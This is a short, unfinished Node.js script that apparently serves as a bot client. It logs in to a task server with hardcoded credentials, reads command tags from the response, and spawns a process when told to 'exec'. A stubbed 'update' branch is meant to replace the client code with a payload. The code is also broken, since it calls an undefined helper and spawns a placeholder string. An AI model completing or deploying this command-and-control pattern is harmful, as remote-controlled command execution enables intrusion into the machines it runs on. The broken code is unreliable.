curl = require('request');
exec = require('child_process');

//
//
target = 'http://localhost:8000/task';

//
//
function getAttribute(text, tag){
	start = text.indexOf(tag);
	end = text.indexOf('" ', start);
	data = text.substr(start+tag.length+2,end-start-tag.length-2);
	return data;
};

//
//
curl.post( {url: target, formData: {enter:'Enter',username:'webbot',password:'sp1der3'}}, function(err, res, body){
		vtable = getDataAsArray(body,'<task','>');
		for (var i = vtable.length - 1; i >= 0; i--) {
			// Get all attributes
			vAttr = [];
			//
			link = getAttribute( vtable[i], 'cmd')
			console.log( 'Received command from server: ' + link );
			// Evaluate cmd TODO
			if ( link == 'exec'){
				console.log('TODO Execute given command');
				child = exec.spawn('BOT_COMMAND');
				child.on('error', (err) => {
					console.log('Failed to start bot process.');
				});
			}
			else if ( link == 'update'){
				console.log('TODO Update client code with payload');
			}
		}
});
